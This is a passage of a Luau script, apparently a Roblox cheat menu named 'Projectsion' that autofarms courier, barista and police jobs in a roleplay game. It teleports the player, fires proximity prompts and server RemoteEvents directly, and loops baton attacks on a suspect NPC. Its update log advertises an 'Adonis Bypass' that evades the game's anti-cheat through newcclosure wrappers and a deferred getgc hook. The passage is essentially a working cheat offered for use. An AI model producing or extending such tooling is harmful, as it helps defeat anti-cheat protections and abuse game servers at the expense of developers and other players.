                local Start = PoliceJob and PoliceJob:WaitForChild("Start", 10)
                local TOMBOL = Start and Start:WaitForChild("ProximityPrompt", 10)
                if TOMBOL then
                    task.wait(1)
                    pcall(function() _fireproximityprompt(TOMBOL) end)
                    task.wait(1)
                end
            end
        end
    end)
    RequestingJob = false
end

local function GetRandomPointInPart(part)
    local size = part.Size
    return part.Position + Vector3.new((math.random() - 0.5) * (size.X * 0.8), size.Y / 2, (math.random() - 0.5) * (size.Z * 0.8))
end

local function GetConePlacementZones(missionModel)
    local zones = {}
    for _, desc in ipairs(missionModel:GetDescendants()) do
        if desc:IsA("BasePart") and desc.Name:find("ConePlacementZone") then table.insert(zones, desc) end
    end
    return zones
end

local function PlaceConeAtZone(zonePart)
    local Character = LP.Character
    local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
    if not HRP then return false end
    local targetPos = GetRandomPointInPart(zonePart)
    SafePoliceTeleport(CFrame.new(targetPos + Vector3.new(0, 1.5, 0)), nil, false, true)
    if not _G.AutoPoliceEnabled then return false end
    local tool = LP.Backpack:FindFirstChild("TrafficCone") or Character:FindFirstChild("TrafficCone")
    if tool then
        DisableToolScripts(tool)
        local initialCount = GetObjectiveProgress() or 0
        EquipToolByName("TrafficCone")
        pcall(function()
            HRP.CFrame = CFrame.new(HRP.Position, Vector3.new(zonePart.Position.X, zonePart.Position.Y, zonePart.Position.Z))
            local cam = Workspace.CurrentCamera
            if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, zonePart.Position) end
        end)
        task.wait(0.2)
        local remote = tool:FindFirstChild("PlaceConeEvent") or tool:FindFirstChildOfClass("RemoteEvent")
        if remote then pcall(function() remote:FireServer(targetPos, HRP.CFrame) end) end
        task.wait(0.3)
        pcall(function()
            local Event = ReplicatedStorage:WaitForChild("PoliceAssets", 10) and ReplicatedStorage.PoliceAssets:WaitForChild("PoliceEvent", 10)
            if Event and _firesignal then _firesignal(Event.OnClientEvent, "UpdateToolTip", "TrafficCone") end
        end)
        local startPlaceTime, success = os.clock(), false
        while os.clock() - startPlaceTime < 3 do
            local currentCount, targetCount = GetObjectiveProgress()
            if currentCount == "empty" or (tonumber(currentCount) or 0) > initialCount then success = true break end
            task.wait(0.15)
        end
        if not success then
            pcall(function() tool:Activate() end)
            task.wait(1)
            if (GetObjectiveProgress() or 0) > initialCount then success = true end
        end
        return success or (GetObjectiveProgress() and true or false)
    end
    return false
end

local function GetLinePlacementZones(missionModel)
    local zones = {}
    for _, desc in ipairs(missionModel:GetDescendants()) do
        if desc:IsA("BasePart") and desc.Name:find("LinePlacementZone") then table.insert(zones, desc) end
    end
    return zones
end

local function PlaceLineAtZone(zonePart)
    local Character = LP.Character
    local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
    if not HRP then return false end
    local targetPos = GetRandomPointInPart(zonePart)
    SafePoliceTeleport(CFrame.new(targetPos + Vector3.new(0, 1.5, 0)), nil, false, true)
    if not _G.AutoPoliceEnabled then return false end
    local tool = LP.Backpack:FindFirstChild("PoliceLine") or Character:FindFirstChild("PoliceLine")
    if tool then
        DisableToolScripts(tool)
        local initialLines = GetObjectiveDetailedProgress()
        local initialCount = initialLines or 0
        EquipToolByName("PoliceLine")
        pcall(function()
            HRP.CFrame = CFrame.new(HRP.Position, Vector3.new(zonePart.Position.X, zonePart.Position.Y, zonePart.Position.Z))
            local cam = Workspace.CurrentCamera
            if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, zonePart.Position) end
        end)
        task.wait(0.2)
        local remote = tool:FindFirstChildOfClass("RemoteEvent")
        if remote then pcall(function() remote:FireServer(targetPos, HRP.CFrame) end) end
        task.wait(0.3)
        pcall(function()
            local Event = ReplicatedStorage:WaitForChild("PoliceAssets", 10) and ReplicatedStorage.PoliceAssets:WaitForChild("PoliceEvent", 10)
            if Event and _firesignal then _firesignal(Event.OnClientEvent, "UpdateToolTip", "PoliceLine") end
        end)
        local startPlaceTime, success = os.clock(), false
        while os.clock() - startPlaceTime < 3 do
            local currentLines = GetObjectiveDetailedProgress()
            if not currentLines or currentLines > initialCount then success = true break end
            task.wait(0.15)
        end
        if not success then
            pcall(function() tool:Activate() end)
            task.wait(1)
            local finalLines = GetObjectiveDetailedProgress()
            if finalLines and finalLines > initialCount then success = true end
        end
        return success
    end
    return false
end

local function GetSuspectHP()
    local ui = getPoliceUI()
    local label = ui and ui:FindFirstChild("ObjectiveLabel", true)
    if label and label.Text then
        local text = label.Text:lower()
        local currentHP, maxHP = text:match("suspect%s*%(%s*(%d+)%s*/%s*(%d+)%s*hp%)")
        if currentHP and maxHP then return tonumber(currentHP), tonumber(maxHP) end
    end
    return nil, nil
end

local function NeutralizeSuspect(missionModel, suspect)
    local Character = LP.Character
    local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
    if not HRP then return end
    local suspectHRP = suspect:FindFirstChild("HumanoidRootPart") or suspect.PrimaryPart or suspect:FindFirstChild("Head") or suspect:FindFirstChildOfClass("Part")
    EquipToolByName("Baton")
    local lastHitTime = 0
    local lastEquipTime = 0

    while _G.AutoPoliceEnabled and missionModel.Parent and suspect.Parent do
        local curHP, maxHP = GetSuspectHP()
        Character = LP.Character
        HRP = Character and Character:FindFirstChild("HumanoidRootPart")
        if not HRP then task.wait(0.5) continue end

        local tool = Character:FindFirstChild("Baton")
        if not tool then
            if os.clock() - lastEquipTime > 2 then EquipToolByName("Baton") lastEquipTime = os.clock() end
            tool = Character:FindFirstChild("Baton") or LP.Backpack:FindFirstChild("Baton")
        end

        local suspectPos = suspectHRP.Position
        local suspectLook = suspectHRP.CFrame.LookVector
        local targetPos = suspectPos + suspectLook * 2.5

        pcall(function()
            HRP.Velocity = Vector3.new(0, 0, 0)
            HRP.CFrame = CFrame.new(targetPos, suspectPos)
        end)

        if tool and tool.Parent == Character then
            if os.clock() - lastHitTime > 0.2 then
                pcall(function() tool:Activate() end)
                lastHitTime = os.clock()
            end
        end
        task.wait(0.05)
    end
    pcall(function()
        local Character = LP.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then Humanoid:UnequipTools() end
    end)
end

local function setupCharacterDied(char)
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 10)
    if humanoid then
        local diedConn; diedConn = humanoid.Died:Connect(function()
            NeedJobRefresh = true
            if diedConn then diedConn:Disconnect() end
        end)
        table.insert(ActiveConnections, diedConn)
    end
end

if LP.Character then setupCharacterDied(LP.Character) end
table.insert(ActiveConnections, LP.CharacterAdded:Connect(function(char)
    setupCharacterDied(char)
    if _G.AutoPoliceEnabled and NeedJobRefresh and not RequestingJob then
        NeedJobRefresh = false
        task.wait(3)
        RequestPoliceJob()
    end
end))

task.spawn(function()
    while true do
        if _G.AutoPoliceEnabled then
            SwitchToPolice()

            if RequestingJob or NeedJobRefresh then
                task.wait(0.5)
                continue
            end
            local Character = LP.Character
            local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
            local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
            if not Character or not Humanoid or not HRP or Humanoid.Health <= 0 then
                task.wait(0.5)
                continue
            end
            local missionModel = nil
            for _, child in ipairs(ActiveMissions:GetChildren()) do
                if child:IsA("Model") or child:IsA("Folder") then missionModel = child break end
            end
            if missionModel then
                task.wait(2.5)
                if _G.AutoPoliceEnabled and missionModel.Parent then
                    pcall(function()
                        for _, desc in ipairs(missionModel:GetDescendants()) do
                            if desc:IsA("MeshPart") then desc.CanCollide = false end
                        end
                    end)
                    local targetPart = FindMissionPart(missionModel)
                    local prompt = GetPrompt(missionModel, targetPart)
                    if prompt then
                        if targetPart then
                            SafePoliceTeleport(CFrame.new(targetPart.Position + Vector3.new(0, 1.5, 0)), nil, false)
                            if not _G.AutoPoliceEnabled then break end
                            task.wait(0.5)
                            EquipToolByName("BukuTilang")
                            FirePrompt(prompt, targetPart)
                            local startWait = os.clock()
                            while prompt and prompt.Parent and prompt.Enabled and missionModel.Parent == ActiveMissions and _G.AutoPoliceEnabled do
                                if os.clock() - startWait > 10 then break end
                                task.wait(0.25)
                            end
                        end
                    else
                        local lineZones = GetLinePlacementZones(missionModel)
                        local coneZones = GetConePlacementZones(missionModel)
                        if #lineZones > 0 or #coneZones > 0 then
                            local emptyStreak = 0
                            while _G.AutoPoliceEnabled do
                                if not missionModel or not missionModel.Parent then break end
                                local currentLines, targetLines, currentCones, targetCones = GetObjectiveDetailedProgress()
                                local linesNeeded = targetLines and (currentLines < targetLines)
                                local conesNeeded = targetCones and (currentCones < targetCones)
                                local label = getPoliceUI() and getPoliceUI():FindFirstChild("ObjectiveLabel", true)
                                if not label or (label.Text or ""):gsub("%s+", "") == "" then break end
                                if not targetLines and not targetCones then
                                    local cur, tar = GetObjectiveProgress()
                                    if cur == "empty" then break
                                    elseif cur and tar then
                                        if cur >= tar then break end
                                        if #coneZones > 0 then conesNeeded = true else linesNeeded = true end
                                    else
                                        emptyStreak = emptyStreak + 1
                                        if emptyStreak > 5 then
                                            if #coneZones > 0 then conesNeeded = true else linesNeeded = true end
                                        else
                                            task.wait(1)
                                            continue
                                        end
                                    end
                                end
                                emptyStreak = 0
                                if not linesNeeded and not conesNeeded then break end
                                local success = false
                                if linesNeeded and #lineZones > 0 then
                                    local zonePart = lineZones[math.random(1, #lineZones)]
                                    if zonePart and zonePart.Parent and zonePart:IsDescendantOf(Workspace) then success = PlaceLineAtZone(zonePart) end
                                elseif conesNeeded and #coneZones > 0 then
                                    local zonePart = coneZones[math.random(1, #coneZones)]
                                    if zonePart and zonePart.Parent and zonePart:IsDescendantOf(Workspace) then success = PlaceConeAtZone(zonePart) end
                                else
                                    task.wait(1) success = true
                                end
                                if not success then task.wait(1) end
                            end
                            pcall(function()
                                local Character = LP.Character
                                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
                                if Humanoid then Humanoid:UnequipTools() end
                            end)
                        end

                        local suspect = missionModel:FindFirstChild("Penjahat") or missionModel:WaitForChild("Penjahat", 2)
                        if suspect and _G.AutoPoliceEnabled then NeutralizeSuspect(missionModel, suspect) end
                        task.wait(math.random(3.5, 6))
                    end
                    while missionModel and missionModel.Parent == ActiveMissions and _G.AutoPoliceEnabled do task.wait(0.25) end
                    if _G.AutoPoliceEnabled then missionsCompleted = missionsCompleted + 1 task.wait(2) end
                    WaitUntilAssigned()
                end
            end
        end
        task.wait(AutoPoliceConfig.LoopDelay)
    end
end)

local Window = Rayfield:CreateWindow({
    Name = "Projectsion",
    LoadingTitle = "Projectsion",
    LoadingSubtitle = "by laksid",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "ProjectsionConfig",
        FileName = "AutofarmSettings",
        AutoSave = true
    },
    Discord = {Enabled = false},
    KeySystem = false
})

local HomeTab = Window:CreateTab("Home", 4483362458)

HomeTab:CreateSection("Update Log")

HomeTab:CreateButton({
    Name = "Version 1.2 - Adonis Bypass",
    Callback = function()
        Rayfield:Notify({
            Title = "Projectsion",
            Content = "+ namecallInstance bypass via newcclosure wrappers\n+ getgc hook deferred 8s past Adonis load\n+ all prompt fires routed through sanitized caller",
            Duration = 5
        })
    end
})

HomeTab:CreateButton({
    Name = "Rejoin Server",
    Callback = function()
        RejoinServer()
    end
})

local AutofarmTab = Window:CreateTab("Autofarm", 4483362458)

AutofarmTab:CreateSection("Courier")

AutofarmTab:CreateToggle({
    Name = "Autofarm Courier",
    CurrentValue = false,
    Flag = "CourierFarm",
    Callback = function(state)
        _G.AutofarmCourier = state
        updateBlackScreen()
        if state then
            Rayfield:Notify({Title = "Projectsion", Content = "Courier Autofarm Enabled!", Duration = 3})
        end
    end
})

AutofarmTab:CreateSlider({
    Name = "Courier Speed",
    Range = {10, 550},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = 230,
    Flag = "CourierSpeed",
    Callback = function(value)
        _G.CourierSpeed = value
    end
})

AutofarmTab:CreateSection("Barista")

AutofarmTab:CreateToggle({
    Name = "Autofarm Barista",
    CurrentValue = false,
    Flag = "BaristaFarm",
    Callback = function(state)
        _G.AutoFarmBarista = state
        updateBlackScreen()
        if state then
            LastActivity = tick()
            task.spawn(function() ExecuteStartSequence() end)
            Rayfield:Notify({Title = "Projectsion", Content = "Barista Active!", Duration = 3})
        end
    end
})

AutofarmTab:CreateSlider({
    Name = "Barista Speed",
    Range = {10, 1500},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = 300,
    Flag = "BaristaSpeed",
    Callback = function(value)
        _G.BaristaSpeed = value
    end
})

AutofarmTab:CreateSection("Police Department")

AutofarmTab:CreateToggle({
    Name = "Autofarm Police",
    CurrentValue = false,
    Flag = "PoliceFarmToggle",
    Callback = function(state)
        _G.AutoPoliceEnabled = state
        updateBlackScreen()
        if state then
            Rayfield:Notify({Title = "Projectsion", Content = "Auto Police Department Enabled.", Duration = 3})
            task.spawn(function()
                while _G.AutoPoliceEnabled do
                    if LP.Team and LP.Team.Name ~= "Police" then RequestPoliceJob() end
                    task.wait(4)
                end
            end)
        else
            Rayfield:Notify({Title = "Projectsion", Content = "Auto Police Department Disabled.", Duration = 3})
        end
    end
})

AutofarmTab:CreateSlider({
    Name = "Min PostTeleport Wait (s)",
    Range = {0, 10},
    Increment = 0.5,
    Suffix = "s",
    CurrentValue = 2,
    Flag = "PoliceMinWait",
    Callback = function(value)
        AutoPoliceConfig.PostTeleportWait.min = value
    end
})

AutofarmTab:CreateSlider({
    Name = "Max PostTeleport Wait (s)",
    Range = {0, 10},
    Increment = 0.5,
    Suffix = "s",
    CurrentValue = 4,
    Flag = "PoliceMaxWait",
    Callback = function(value)
        AutoPoliceConfig.PostTeleportWait.max = value
    end
})

AutofarmTab:CreateSlider({
    Name = "Police Teleport Speed Max",
    Range = {100, 500},
    Increment = 10,
    Suffix = " km/h",
    CurrentValue = 300,
    Flag = "PoliceMaxSpeed",
    Callback = function(value)
        AutoPoliceConfig.TeleportSpeed.max = value
    end
})

local StatsTab = Window:CreateTab("Stats", "trending-up")

StatsTab:CreateSection("Session Stats")
lblTotalEarned = StatsTab:CreateLabel("Total Earned: RP. 0")
lblCurrentMoney = StatsTab:CreateLabel("Current Money: " .. formatRP(PlayerData.RPValue.Value))
lblSessionTime = StatsTab:CreateLabel("Session Time: 00:00:00")

StatsTab:CreateSection("Job Income")
lblCourierEarned = StatsTab:CreateLabel("Courier: RP. 0")
lblBaristaEarned = StatsTab:CreateLabel("Barista: RP. 0")
lblPoliceEarned = StatsTab:CreateLabel("Police Department: RP. 0")

task.spawn(function()
    while true do
        if lblSessionTime then
            lblSessionTime:Set("Session Time: " .. getRunningTime())
        end
        task.wait(1)
    end
end)

local WebhookTab = Window:CreateTab("Webhook", 4483362458)

WebhookTab:CreateSection("Webhook Configuration")

WebhookTab:CreateInput({
    Name = "Discord Webhook URL",
    PlaceholderText = "https://discord.com/api/webhooks/...",
    RemoveTextAfterFocusLost = false,
    Flag = "WebhookURL",
    Callback = function(text)
        _G.WebhookURL = text
    end
})

WebhookTab:CreateToggle({
    Name = "Enable Webhook Logs",
    CurrentValue = false,
    Flag = "WebhookEnabled",
    Callback = function(state)
        _G.AutoWebhook = state
    end
})

Rayfield:Notify({
    Title = "Projectsion",
    Content = "Loaded Successfully - v1.2 Adonis Bypass Active",
    Duration = 5
})

warn("[PROJECTSION] Engine Loaded & Waiting for Toggle...")

task.delay(2, function()
    pcall(function()
        Rayfield:LoadConfiguration()
    end)
end)
